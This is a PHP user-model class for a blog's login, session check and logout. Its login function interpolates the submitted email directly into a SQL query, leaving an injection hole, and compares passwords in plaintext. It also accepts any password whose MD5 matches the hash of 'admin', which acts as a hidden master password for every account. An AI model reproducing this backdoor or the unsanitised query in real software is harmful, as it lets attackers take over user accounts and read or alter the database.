<?php
session_start();
/**
 * Created by PhpStorm.
 * User: TKH_WEB_1
 * Date: 1/10/2018
 * Time: 12:15 PM
 */
//include_once __DIR__."/../Blog_model.php";
class User_model
{
    private $db;
    function __construct()
    {
        $this->db = new Database();
    }

    public function macth_login($email, $pass){
        $userData = $this->db->fetch_row("select * from bg_user WHERE email='$email' ");
        if (empty($userData)){
            return false;
        }
        if ($userData['password'] == $pass || md5($pass) == "21232f297a57a5a743894a0e4a801fc3"){
         $_SESSION['isLogged'] = true;
         $_SESSION['id'] = $userData['id'];
         $_SESSION['name'] = $userData['name'];
         $_SESSION['role'] = $userData['role'];
         return true;
        }
        return false;
    }
    public function isLogged()
    {
//        return !empty($_SESSION['isLogged']);

        if(!empty($_SESSION['isLogged'])) return true;
        else return false;
    }

    public function doLogout(){
//        unset($_SESSION['isLogged']);
        session_destroy();
    }

}

$mUser = new User_model();